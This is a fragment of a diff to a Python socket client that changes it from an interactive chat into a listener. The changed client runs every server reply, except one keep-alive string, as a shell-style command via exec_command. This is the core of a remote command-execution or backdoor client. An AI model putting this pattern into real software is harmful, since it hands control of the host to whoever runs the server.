@@ -14,16 +14,12 @@ def send_data(sock: socket.socket):
         print('Connection aborted (not in the whitelist)')
         return
     
-    try:
-        while True:
-            print('Enter exit to terminate the communication')
-            msg = input('> ') # Takes the user input
-            if msg == 'exit':
-                break
-            
-            # Send data to the server
-            sock.sendall(msg.encode('utf-8')) 
+    try:            
+        msg = 'First connection ping'    
+        # Send data to the server
+        sock.sendall(msg.encode('utf-8')) 
 
+        while not is_socket_closed(sock): # the client now only listen 
             # Get data back from server
             get_data(sock)
 
@@ -32,6 +28,7 @@ def send_data(sock: socket.socket):
     except ConnectionResetError:
         print('The server closed the connection')
     finally:
+        print('Connection closed')
         sock.close()
 
 
@@ -39,11 +36,9 @@ def get_data(sock: socket.socket):
     try: 
         res = sock.recv(1024).decode('utf-8')
         print(f'Server response : {res}')
-        if 'ls' in res:
+        if res != 'Alive ping back received':
             command = res.split(' ')
             exec_command(command)
-        else:
-            print(res)
     except socket.timeout:
         print("Timeout, no response from server")
     except ConnectionAbortedError :
